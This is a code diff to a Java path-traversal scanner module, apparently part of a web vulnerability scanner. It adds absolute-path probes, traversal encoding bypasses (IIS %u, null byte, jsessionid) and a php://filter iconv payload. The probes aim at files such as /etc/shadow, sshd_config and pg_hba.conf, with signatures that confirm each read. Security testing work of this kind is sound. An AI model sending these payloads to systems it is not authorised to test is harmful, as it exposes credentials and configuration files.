@@ -110,6 +110,12 @@ public class PathTraversalScanner implements ScanModule {
         int baselineLen = baselineBody != null ? baselineBody.length() : 0;
         int baselineStatus = baseline.response().statusCode();
 
+        // Phase 1.5: Absolute path testing (no traversal sequences)
+        // Catches apps that use the parameter as a direct file path without any path joining
+        if (config.getBool("traversal.absolutePath.enabled", true)) {
+            if (testAbsolutePaths(original, target, url, baselineBody, baselineLen)) return;
+        }
+
         // Phase 2: Unix traversal
         if (config.getBool("traversal.unix.enabled", true)) {
             if (testUnixTraversal(original, target, url, maxDepth, baselineBody, baselineLen)) return;
@@ -131,6 +137,51 @@ public class PathTraversalScanner implements ScanModule {
         }
     }
 
+    // ==================== PHASE 1.5: ABSOLUTE PATH TESTING ====================
+
+    private boolean testAbsolutePaths(HttpRequestResponse original, TraversalTarget target,
+                                       String url, String baselineBody, int baselineLen)
+            throws InterruptedException {
+        // Test direct absolute paths — catches apps that use the parameter as a file path
+        // without any directory joining. Tested before traversal since they need fewer requests.
+        String[][] absolutePaths = {
+                {"/etc/passwd", "UNIX_PASSWD"},
+                {"/etc/shadow", "UNIX_SHADOW"},
+                {"C:\\windows\\win.ini", "WIN_INI"},
+                {"C:/windows/win.ini", "WIN_INI"},
+        };
+
+        for (String[] pathDef : absolutePaths) {
+            String absPath = pathDef[0];
+            String checkType = pathDef[1];
+
+            HttpRequestResponse result = sendPayload(original, target, absPath);
+            if (result == null || result.response() == null) continue;
+            if (result.response().statusCode() >= 400) continue;
+
+            String body = result.response().bodyToString();
+            if (body == null) continue;
+
+            ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
+            if (confirmed != null) {
+                findingsStore.addFinding(Finding.builder("path-traversal",
+                                "Direct File Read via Absolute Path: " + absPath,
+                                Severity.CRITICAL, Confidence.CERTAIN)
+                        .url(url).parameter(target.name)
+                        .evidence("Payload: " + absPath + " (absolute path, no traversal) | Match: " + confirmed.evidence)
+                        .description("Local file read confirmed via direct absolute path injection. "
+                                + "Parameter '" + target.name + "' accepts absolute file paths without traversal sequences.")
+                        .remediation("Never use user input directly in file paths. Use a whitelist of allowed "
+                                + "files or IDs that map to server-side paths.")
+                        .requestResponse(result)
+                        .build());
+                return true;
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
     // ==================== PHASE 2: UNIX TRAVERSAL ====================
 
     private boolean testUnixTraversal(HttpRequestResponse original, TraversalTarget target,
@@ -138,11 +189,9 @@ public class PathTraversalScanner implements ScanModule {
                                        int baselineLen) throws InterruptedException {
         String[][] unixFiles = {
                 {"etc/passwd", "UNIX_PASSWD"},
-                {"etc/hostname", "UNIX_HOSTNAME"},
                 {"proc/self/environ", "UNIX_ENVIRON"},
                 {"proc/self/cmdline", "UNIX_CMDLINE"},
                 {"etc/shadow", "UNIX_SHADOW"},
-                {"etc/issue", "UNIX_ISSUE"},
                 {"etc/group", "UNIX_GROUP"},
                 {"etc/resolv.conf", "UNIX_RESOLV"},
                 {"proc/version", "UNIX_PROCVERSION"},
@@ -153,6 +202,16 @@ public class PathTraversalScanner implements ScanModule {
                 {"proc/net/tcp", "UNIX_PROCTCP"},
                 {"etc/nginx/nginx.conf", "UNIX_NGINX"},
                 {"etc/apache2/apache2.conf", "UNIX_APACHE"},
+                {"etc/ssh/sshd_config", "UNIX_SSHD"},
+                {"etc/mysql/my.cnf", "UNIX_MYSQL"},
+                {"etc/my.cnf", "UNIX_MYSQL"},
+                {"etc/redis/redis.conf", "UNIX_REDIS"},
+                {"etc/redis.conf", "UNIX_REDIS"},
+                {"etc/ssl/openssl.cnf", "UNIX_OPENSSL"},
+                {"var/log/apache2/access.log", "UNIX_ACCESSLOG"},
+                {"var/log/httpd/access_log", "UNIX_ACCESSLOG"},
+                {"etc/postgresql/15/main/pg_hba.conf", "UNIX_PGHBA"},
+                {"etc/postgresql/16/main/pg_hba.conf", "UNIX_PGHBA"},
         };
 
         for (String[] fileDef : unixFiles) {
@@ -204,7 +263,8 @@ public class PathTraversalScanner implements ScanModule {
                 {"windows\\php.ini", "WIN_PHPINI"},
                 {"inetpub\\wwwroot\\web.config", "WIN_WEBCONFIG"},
                 {"windows\\debug\\NetSetup.log", "WIN_NETSETUP"},
-                {"windows\\repair\\sam", "WIN_SAM"},
+                {"windows\\system32\\license.rtf", "WIN_LICENSE"},
+                {"programdata\\mysql\\my.ini", "WIN_MYSQL"},
         };
 
         for (String[] fileDef : winFiles) {
@@ -308,6 +368,16 @@ public class PathTraversalScanner implements ScanModule {
                 {"/..\\.\\".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Reverse mixed traversal"},
                 // UTF-8 full-width dot
                 {"\uff0e\uff0e/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "UTF-8 fullwidth dots"},
+                // IIS 16-bit Unicode encoding
+                {"%u002e%u002e%u002f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "IIS 16-bit Unicode (%u002e)"},
+                // UTF-8 fullwidth solidus (U+FF0F for /)
+                {"..%ef%bc%8f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "UTF-8 fullwidth solidus"},
+                // Tomcat/Jetty session bypass (semicolon treated as path parameter delimiter)
+                {"..;jsessionid=x/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Tomcat jsessionid bypass (..;jsessionid=x/)"},
+                // Null byte between traversal segments
+                {"..%00/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Null byte in traversal segment"},
+                // Carriage return in traversal
+                {"..%0d/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Carriage return in traversal"},
         };
 
         for (String[] bypass : bypasses) {
@@ -479,6 +549,37 @@ public class PathTraversalScanner implements ScanModule {
                                     + "ROT13-encoded PHP markers confirm file content was read.")
                             .remediation("Disable PHP stream wrappers. Use a whitelist of includable files.")
                             .requestResponse(rot13Result)
+                            .build());
+                }
+            }
+        }
+        perHostDelay();
+
+        // php://filter with iconv UTF-8 to UTF-7 encoding
+        // Structural validation: UTF-7 markers (+ADw- for <, +AD4- for >) confirm filter chain worked
+        String iconvPayload = "php://filter/convert.iconv.UTF-8.UTF-7/resource=index";
+        HttpRequestResponse iconvResult = sendPayload(original, target, iconvPayload);
+        if (iconvResult != null && iconvResult.response() != null
+                && iconvResult.response().statusCode() == 200) {
+            String iconvBody = iconvResult.response().bodyToString();
+            if (iconvBody != null && (baselineBody == null || !iconvBody.equals(baselineBody))) {
+                // UTF-7 encoding of < is +ADw-, > is +AD4-, " is +ACI-, [ is +AFs-
+                int utf7Count = 0;
+                if (iconvBody.contains("+ADw-")) utf7Count++;
+                if (iconvBody.contains("+AD4-")) utf7Count++;
+                if (iconvBody.contains("+ACI-")) utf7Count++;
+                if (iconvBody.contains("+AFs-")) utf7Count++;
+                if (utf7Count >= 2
+                        && (baselineBody == null || !baselineBody.contains("+ADw-"))) {
+                    findingsStore.addFinding(Finding.builder("path-traversal",
+                                    "LFI via php://filter (iconv UTF-7) — Source Code Disclosure",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Payload: " + iconvPayload + " | UTF-7 markers found (" + utf7Count + "/4)")
+                            .description("PHP filter wrapper with iconv UTF-8 to UTF-7 conversion returned source code. "
+                                    + "UTF-7 encoded markers confirm file content was read through the filter chain.")
+                            .remediation("Disable PHP stream wrappers. Use a whitelist of includable files.")
+                            .requestResponse(iconvResult)
                             .build());
                 }
             }
@@ -850,6 +951,103 @@ public class PathTraversalScanner implements ScanModule {
                 // REMOVED: The check (body differs from baseline) has zero specificity.
                 // Any different response would match. No structural signature exists for
                 // the SAM binary format that we can reliably detect in HTTP responses.
+                break;
+            }
+            case "UNIX_SSHD": {
+                // Require 2+ of: Port, PermitRootLogin, PasswordAuthentication, AuthorizedKeysFile
+                int sshdMarkers = 0;
+                if (body.contains("PermitRootLogin")) sshdMarkers++;
+                if (body.contains("PasswordAuthentication")) sshdMarkers++;
+                if (body.contains("AuthorizedKeysFile")) sshdMarkers++;
+                if (body.contains("ChallengeResponseAuthentication")) sshdMarkers++;
+                if (Pattern.compile("^\\s*Port\\s+\\d+", Pattern.MULTILINE).matcher(body).find()) sshdMarkers++;
+                if (sshdMarkers >= 2 && (baselineBody == null
+                        || !baselineBody.contains("PermitRootLogin"))) {
+                    return new ConfirmedRead("sshd_config content: " + sshdMarkers + " SSH directives found");
+                }
+                break;
+            }
+            case "UNIX_MYSQL": {
+                // Require [mysqld] section header AND 1+ of: datadir, socket, port, bind-address
+                if (body.contains("[mysqld]")) {
+                    int mysqlMarkers = 0;
+                    if (body.contains("datadir")) mysqlMarkers++;
+                    if (body.contains("socket")) mysqlMarkers++;
+                    if (Pattern.compile("^\\s*port\\s*=", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE).matcher(body).find()) mysqlMarkers++;
+                    if (body.contains("bind-address")) mysqlMarkers++;
+                    if (mysqlMarkers >= 1 && (baselineBody == null || !baselineBody.contains("[mysqld]"))) {
+                        return new ConfirmedRead("my.cnf content: [mysqld] + " + mysqlMarkers + " MySQL directives");
+                    }
+                }
+                break;
+            }
+            case "UNIX_PGHBA": {
+                // pg_hba.conf has a distinctive header: # TYPE  DATABASE  USER  ADDRESS  METHOD
+                Pattern pgHbaHeader = Pattern.compile("# TYPE\\s+DATABASE\\s+USER", Pattern.CASE_INSENSITIVE);
+                boolean hasHeader = pgHbaHeader.matcher(body).find();
+                boolean hasAuthLine = Pattern.compile("^\\s*(?:local|host|hostssl|hostnossl)\\s+\\S+\\s+\\S+",
+                        Pattern.MULTILINE).matcher(body).find();
+                if (hasHeader && hasAuthLine
+                        && (baselineBody == null || !pgHbaHeader.matcher(baselineBody).find())) {
+                    return new ConfirmedRead("pg_hba.conf content: TYPE/DATABASE/USER header + auth rules");
+                }
+                break;
+            }
+            case "UNIX_ACCESSLOG": {
+                // Apache/nginx combined log format: IP - - [date] "METHOD /path HTTP/x.x" status size
+                Pattern accessLogPattern = Pattern.compile(
+                        "\\d+\\.\\d+\\.\\d+\\.\\d+\\s+\\S+\\s+\\S+\\s+\\[.+?\\]\\s+\"(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\\s+");
+                if (accessLogPattern.matcher(body).find()
+                        && (baselineBody == null || !accessLogPattern.matcher(baselineBody).find())) {
+                    return new ConfirmedRead("Access log content: Apache/nginx combined log format entries");
+                }
+                break;
+            }
+            case "UNIX_REDIS": {
+                // Require 2+ of: bind, port (with number), requirepass, dir (with path), dbfilename
+                int redisMarkers = 0;
+                if (Pattern.compile("^\\s*bind\\s+", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
+                if (Pattern.compile("^\\s*port\\s+\\d+", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
+                if (body.contains("requirepass")) redisMarkers++;
+                if (Pattern.compile("^\\s*dir\\s+/", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
+                if (body.contains("dbfilename")) redisMarkers++;
+                if (redisMarkers >= 2 && (baselineBody == null || !baselineBody.contains("dbfilename"))) {
+                    return new ConfirmedRead("redis.conf content: " + redisMarkers + " Redis directives found");
+                }
+                break;
+            }
+            case "UNIX_OPENSSL": {
+                // Require 2+ of: [req], [v3_ca], default_bits, distinguished_name, [CA_default]
+                int opensslMarkers = 0;
+                if (body.contains("[req]")) opensslMarkers++;
+                if (body.contains("[v3_ca]")) opensslMarkers++;
+                if (body.contains("default_bits")) opensslMarkers++;
+                if (body.contains("distinguished_name")) opensslMarkers++;
+                if (body.contains("[CA_default]")) opensslMarkers++;
+                if (opensslMarkers >= 2 && (baselineBody == null || !baselineBody.contains("[req]"))) {
+                    return new ConfirmedRead("openssl.cnf content: " + opensslMarkers + " OpenSSL sections/directives");
+                }
+                break;
+            }
+            case "WIN_LICENSE": {
+                // RTF header + Microsoft/Windows keyword
+                if (body.contains("{\\rtf")
+                        && (body.contains("Microsoft") || body.contains("Windows") || body.contains("MICROSOFT"))
+                        && (baselineBody == null || !baselineBody.contains("{\\rtf"))) {
+                    return new ConfirmedRead("license.rtf content: RTF header + Microsoft reference");
+                }
+                break;
+            }
+            case "WIN_MYSQL": {
+                // Require [mysqld] AND 1+ of: datadir, port, socket
+                if (body.contains("[mysqld]")) {
+                    boolean hasDirective = body.contains("datadir")
+                            || Pattern.compile("^\\s*port\\s*=", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE).matcher(body).find()
+                            || body.contains("socket");
+                    if (hasDirective && (baselineBody == null || !baselineBody.contains("[mysqld]"))) {
+                        return new ConfirmedRead("my.ini content: [mysqld] + MySQL directive");
+                    }
+                }
                 break;
             }
         }
